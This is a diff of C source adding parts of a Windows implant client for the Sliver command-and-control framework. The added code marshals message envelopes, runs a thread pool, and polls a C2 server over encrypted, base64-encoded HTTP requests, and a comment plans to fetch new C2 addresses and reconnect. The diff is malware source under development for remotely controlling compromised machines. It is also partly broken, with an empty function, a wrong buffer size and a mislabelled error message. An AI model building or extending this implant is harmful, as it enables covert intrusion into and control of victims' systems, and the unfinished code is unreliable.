@@ -1,5 +1,56 @@
 #include "pch.h"
 
+VOID FreeEnvelope
+(
+	_In_ PENVELOPE pEnvelope
+)
+{
+	if (pEnvelope != NULL) {
+		if (pEnvelope->pData != NULL) {
+			if (pEnvelope->pData->pBuffer != NULL) {
+				FREE(pEnvelope->pData->pBuffer);
+			}
+
+			FREE(pEnvelope->pData);
+		}
+
+		FREE(pEnvelope);
+	}
+}
+
+VOID FreeSliverThreadPool
+(
+	_In_ PSLIVER_THREADPOOL pSliverPool
+)
+{
+	if (pSliverPool != NULL) {
+		if (pSliverPool->pPool != NULL) {
+			CloseThreadpool(pSliverPool->pPool);
+		}
+
+		FREE(pSliverPool);
+	}
+}
+
+PSLIVER_THREADPOOL InitilizeSliverThreadPool()
+{
+	DWORD dwCurrentProcessorNumber = 0;
+	PSLIVER_THREADPOOL pResult = NULL;
+	
+	pResult = ALLOC(sizeof(SLIVER_THREADPOOL));
+	pResult->pPool = CreateThreadpool(NULL);
+	dwCurrentProcessorNumber = GetCurrentProcessorNumber();
+	SetThreadpoolThreadMaximum(pResult->pPool, dwCurrentProcessorNumber);
+	if (!SetThreadpoolThreadMinimum(pResult->pPool, dwCurrentProcessorNumber)) {
+		LogError(L"SetThreadpoolThreadMinimum failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		FreeSliverThreadPool(pResult);
+		return NULL;
+	}
+
+	SetThreadpoolCallbackPool(&pResult->CallBackEnviron, pResult->pPool);
+	return pResult;
+}
+
 PBYTE RegisterSliver
 (
 	_In_ PSLIVER_HTTP_CLIENT pSliverClient,
@@ -160,12 +211,182 @@ CLEANUP:
 	return pResult;
 }
 
+PBUFFER MarshalEnvelope
+(
+	_In_ PENVELOPE pEnvelope
+)
+{
+	PPBElement ElementList[4];
+	DWORD i = 0;
+	PBUFFER pResult = NULL;
+	PPBElement pTemp = NULL;
+
+	SecureZeroMemory(ElementList, sizeof(ElementList));
+	if (pEnvelope->uID != 0) {
+		ElementList[0] = CreateVarIntElement(pEnvelope->uID, 1);
+	}
+
+	if (pEnvelope->uType > 0) {
+		ElementList[1] = CreateVarIntElement(pEnvelope->uType, 2);
+	}
+
+	if (!pEnvelope->uUnknownMessageType) {
+		ElementList[2] = CreateBytesElement(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, 3);
+	}
+	else {
+		ElementList[3] = CreateVarIntElement(TRUE, 4);
+	}
+
+	pResult = ALLOC(sizeof(BUFFER));
+	pTemp = CreateStructElement(ElementList, 4, 0);
+	if (pTemp->SubElements != NULL) {
+		for (i = 0; i < pTemp->dwNumberOfSubElement; i++) {
+			FreeElement(pTemp->SubElements[i]);
+		}
+
+		FREE(pTemp->SubElements);
+	}
+
+	pResult->pBuffer = pTemp->pMarshalledData;
+	pResult->cbBuffer = pTemp->cbMarshalledData;
+	FREE(pTemp);
+	return pResult;
+}
+
+PENVELOPE UnmarshalEnvelope
+(
+	_In_ PBYTE pInput,
+	_In_ DWORD cbInput
+)
+{
+	PPBElement ElementList[4];
+	DWORD i = 0;
+	PENVELOPE pResult = NULL;
+
+	SecureZeroMemory(ElementList, sizeof(ElementList));
+	for (i = 0; i < _countof(ElementList); i++) {
+		ElementList[i] = ALLOC(sizeof(PBElement));
+		ElementList[i]->dwFieldIdx = i + 1;
+	}
+
+	ElementList[0]->Type = Varint;
+	ElementList[1]->Type = Varint;
+	ElementList[2]->Type = Bytes;
+	ElementList[3]->Type = Varint;
+
+	pResult = UnmarshalStruct(ElementList, _countof(ElementList), pInput, cbInput, NULL);
+	for (i = 0; i < _countof(ElementList); i++) {
+		FREE(ElementList[i]);
+	}
+
+	return pResult;
+}
+
 VOID SessionMainLoop
 (
 	_In_ PSLIVER_HTTP_CLIENT pSliverClient
 )
 {
-	
+	PENVELOPE pEnvelope = NULL;
+	PSLIVER_THREADPOOL pSliverPool = NULL;
+	PTP_WORK pWork = NULL;
+	PENVELOPE_WRAPPER pWrapper = NULL;
+
+	pSliverPool = InitilizeSliverThreadPool();
+	if (pSliverPool == NULL) {
+		goto CLEANUP;
+	}
+
+	pWrapper = ALLOC(sizeof(ENVELOPE_WRAPPER));
+	pWrapper->pSliverClient = pSliverClient;
+	pSliverClient->dwPollTimeout = 30;
+	while (TRUE) {
+		pSliverClient->HttpConfig.dwSendTimeout = pSliverClient->dwPollTimeout * 1000;
+		pEnvelope = ReadEnvelope(pSliverClient);
+		if (pEnvelope != NULL) {
+			if (!InternetCheckConnectionW(L"https://learn.microsoft.com", 0, NULL)) {
+				goto CLEANUP;
+			}
+			else {
+				// Lay danh sach C2 moi tai day va tien hanh connect lai
+			}
+		}
+
+		pWrapper->pEnvelope = pEnvelope;
+		pWork = CreateThreadpoolWork(MainHandler, pWrapper, &pSliverPool->CallBackEnviron);
+		if (pWork == NULL) {
+			LogError(L"Process32FirstW failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+			goto CLEANUP;
+		}
+
+		SubmitThreadpoolWork(pWork);
+		FreeEnvelope(pEnvelope);
+		pEnvelope = NULL;
+		Sleep(pSliverClient->dwPollInterval * 1000);
+	}
+
+CLEANUP:
+	FreeEnvelope(pEnvelope);
+	FreeSliverThreadPool(pSliverPool);
+	if (pWrapper != NULL) {
+		FREE(pWrapper);
+	}
+
+	return;
+}
+
+BOOL WriteEnvelope
+(
+	_In_ PSLIVER_HTTP_CLIENT pSliverClient,
+	_In_ PENVELOPE pEnvelope
+)
+{
+	PBUFFER pMarshalledEnvelope = NULL;
+	DWORD cbCipherText = 0;
+	PBYTE pCipherText = NULL;
+	LPSTR lpEncodedData = NULL;
+	LPSTR lpUri = NULL;
+	PURI pUri = NULL;
+	PHTTP_RESP pResp = NULL;
+	BOOL Result = FALSE;
+
+	pMarshalledEnvelope = MarshalEnvelope(pEnvelope);
+	pCipherText = SessionEncrypt(pSliverClient, pMarshalledEnvelope->pBuffer, pMarshalledEnvelope->cbBuffer, &cbCipherText);
+	lpUri = CreateSessionURL(pSliverClient);
+	if (lpUri == NULL) {
+		goto CLEANUP;
+	}
+
+	pUri = UriInit(lpUri);
+	if (pUri == NULL) {
+		goto CLEANUP;
+	}
+
+	lpEncodedData = SliverBase64Encode(pCipherText, cbCipherText);
+	pResp = SendHttpRequest(&pSliverClient->HttpConfig, pSliverClient->pHttpClient, pUri->lpPathWithQuery, POST, NULL, lpEncodedData, lstrlenA(lpEncodedData), FALSE, FALSE);
+	if (pResp == NULL || pResp->dwStatusCode != HTTP_STATUS_OK) {
+		goto CLEANUP;
+	}
+
+	Result = TRUE;
+CLEANUP:
+	if (lpUri != NULL) {
+		FREE(lpUri);
+	}
+
+	if (lpEncodedData != NULL) {
+		FREE(lpEncodedData);
+	}
+
+	if (pCipherText != NULL) {
+		FREE(pCipherText);
+	}
+
+	FreeUri(pUri);
+	FreeBuffer(pMarshalledEnvelope);
+	FreeHttpResp(pResp);
+
+	return Result;
 }
 
 PENVELOPE ReadEnvelope
@@ -173,28 +394,95 @@ PENVELOPE ReadEnvelope
 	_In_ PSLIVER_HTTP_CLIENT pSliverClient
 )
 {
-	PENVELOPE pResult = NULL;
-	LPSTR lpUrlPath = NULL;
-	LPSTR lpNonce = NULL;
+	LPSTR lpUri = NULL;
 	PHTTP_RESP pResp = NULL;
+	PURI pUri = NULL;
+	PENVELOPE pResult = NULL;
+	PBYTE pDecodedData = NULL;
+	DWORD cbDecodedData = 0;
+	PBYTE pPlainText = NULL;
+	DWORD cbPlainText = 0;
 
-	if (pSliverClient->IsClosed) {
+	lpUri = CreatePollURL(pSliverClient);
+	if (lpUri == NULL) {
 		goto CLEANUP;
 	}
 
-	lpUrlPath = ParseSegmentsUrl(pSliverClient, PollType);
-	lpNonce = GenNonceQuery(pSliverClient->uEncoderNonce);
-	lpUrlPath = StrCatExA(lpUrlPath, "?z=");
-	lpUrlPath[lstrlenA(lpUrlPath) - 2] = GenRandomDigit(FALSE);
-	lpUrlPath = StrCatExA(lpUrlPath, lpNonce);
-CLEANUP:
-	if (lpUrlPath != NULL) {
-		FREE(lpUrlPath);
+	pUri = UriInit(lpUri);
+	pResp = SendHttpRequest(&pSliverClient->HttpConfig, pSliverClient->pHttpClient, pUri->lpPathWithQuery, GET, NULL, NULL, 0, FALSE, TRUE);
+	if (pResp == NULL || pResp->pRespData == NULL || pResp->cbResp == 0 || pResp->dwStatusCode != HTTP_STATUS_OK) {
+		goto CLEANUP;
 	}
 
-	if (lpNonce != NULL) {
-		FREE(lpNonce);
+	pDecodedData = SliverBase64Decode(pResp->pRespData, &cbDecodedData);
+	pPlainText = SessionDecrypt(pSliverClient, pDecodedData, cbDecodedData, &cbPlainText);
+	pResult = UnmarshalEnvelope(pPlainText, cbPlainText);
+CLEANUP:
+	if (lpUri != NULL) {
+		FREE(lpUri);
+	}
+
+	if (pPlainText != NULL) {
+		FREE(pPlainText);
+	}
+
+	if (pDecodedData != NULL) {
+		FREE(pDecodedData);
+	}
+
+	FreeUri(pUri);
+	FreeHttpResp(pResp);
+	return pResult;
+}
+
+PSLIVER_REQ UnmarshalSliverReq
+(
+	_In_ PBYTE pInput,
+	_In_ DWORD cbInput
+)
+{
+	PPBElement ElementList[4];
+	DWORD i = 0;
+	PSLIVER_REQ pResult = NULL;
+	LPVOID* pTemp = NULL;
+
+	SecureZeroMemory(ElementList, sizeof(PPBElement));
+	for (i = 0; i < _countof(ElementList); i++) {
+		ElementList[i] = ALLOC(sizeof(PBElement));
+	}
+
+	ElementList[0]->dwFieldIdx = 1;
+	ElementList[1]->dwFieldIdx = 2;
+	ElementList[2]->dwFieldIdx = 8;
+	ElementList[3]->dwFieldIdx = 9;
+
+	ElementList[0]->Type = Varint;
+	ElementList[1]->Type = Varint;
+	ElementList[2]->Type = Bytes;
+	ElementList[3]->Type = Bytes;
+
+	pTemp = UnmarshalStruct(ElementList, _countof(ElementList), pInput, cbInput, NULL);
+	pResult = ALLOC(sizeof(SLIVER_REQ));
+	if (pTemp[0] != NULL) {
+		pResult->Async = TRUE;
+	}
+
+	pResult->uTimeout = pTemp[1];
+	if (pTemp[2] != NULL) {
+		memcpy(pResult->szBeaconID, ((PBUFFER)(pTemp[2]))->pBuffer, ((PBUFFER)(pTemp[2]))->cbBuffer);
+	}
+
+	if (pTemp[3] != NULL) {
+		memcpy(pResult->szSessionID, ((PBUFFER)(pTemp[3]))->pBuffer, ((PBUFFER)(pTemp[3]))->cbBuffer);
 	}
 
 	return pResult;
+}
+
+PBUFFER MarshalSliverReq
+(
+	_In_ PSLIVER_REQ pSliverReq
+)
+{
+
 }
